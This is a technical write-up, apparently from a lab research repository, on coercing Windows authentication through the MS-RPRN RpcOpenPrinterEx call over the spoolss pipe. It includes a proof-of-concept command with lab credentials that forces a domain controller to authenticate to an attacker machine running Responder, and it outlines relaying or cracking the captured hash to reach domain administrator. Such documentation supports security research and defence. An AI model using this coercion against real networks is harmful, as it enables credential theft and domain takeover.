# MS-RPRN - Remote call to RpcOpenPrinterEx (opnum 69)

## Summary

+ **Protocol**: [[MS-RPRN]: Print System Remote Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1)

+ **Protocol UUID**: 12345678-1234-abcd-ef00-0123456789ab

+ **Protocol version**: 1.0

+ **SMB Named pipe**: `\pipe\spoolss`

+ **Function name**: [`RpcOpenPrinterEx`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/0e81ce18-72b1-46c3-8584-a205393b04ff)

+ **Function operation number**: `69`

+ **Authenticated**: Yes


## Description

In order to call a remote procedure to trigger an authentication from the remote machine to an arbitrary target, we first need to authenticate to the remote machine, usually on SMB. Then we need to connect to the remote SMB pipe `\pipe\spoolss` and bind to the desired [`MS-RPRN`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1) protocol (with uuid `12345678-1234-abcd-ef00-0123456789ab` and version `1.0`) in order to perform remote procedure calls to functions in the [`MS-RPRN`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1) protocol.

The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. When starting this script, it will authenticate and connect to the remote pipe named `\pipe\spoolss` This pipe is connected to the protocol [[MS-RPRN]: Print System Remote Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1) and allows to call RPC functions of this protocol. We will then call the remote [`RpcOpenPrinterEx`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/0e81ce18-72b1-46c3-8584-a205393b04ff) function on the remote Windows Server (192.168.2.1) with the following parameters:

```cpp
RpcOpenPrinterEx('192.168.2.51\x00')
```

We can try this with this proof of concept code ([coerce_poc.py](./coerce_poc.py)):

```bash
./coerce_poc.py -d "LAB.local" -u "user1" -p "Podalirius123!" 192.168.2.51 192.168.2.1
```

![](./imgs/poc.png)

This will force the Windows Server (192.168.2.1) to authenticate to the SMB share `\\192.168.2.51\share` and therefore authenticate using its machine account (`DC01$`).  After this RPC call, we get an authentication from the domain controller with its machine account directly on Responder:

![](./imgs/hash.png)

After this step, we relay the authentication to other services in order to elevate our privileges, or try to downgrade it to NTLMv1 and crack it in order to get the NT hash of the domain controller's machine account. This kind of vulnerabilities allows to quickly get from user to domain administrator in unprotected domains!


## Function technical detail

```cpp
DWORD RpcOpenPrinterEx(
   [in, string, unique] STRING_HANDLE pPrinterName,
   [out] PRINTER_HANDLE* pHandle,
   [in, string, unique] wchar_t* pDatatype,
   [in] DEVMODE_CONTAINER* pDevModeContainer,
   [in] DWORD AccessRequired,
   [in] SPLCLIENT_CONTAINER* pClientInfo
 );
```

## References

+ Documentation of protocol [MS-RPRN]: Print System Remote Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1

+ Documentation of function `RpcOpenPrinterEx`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/0e81ce18-72b1-46c3-8584-a205393b04ff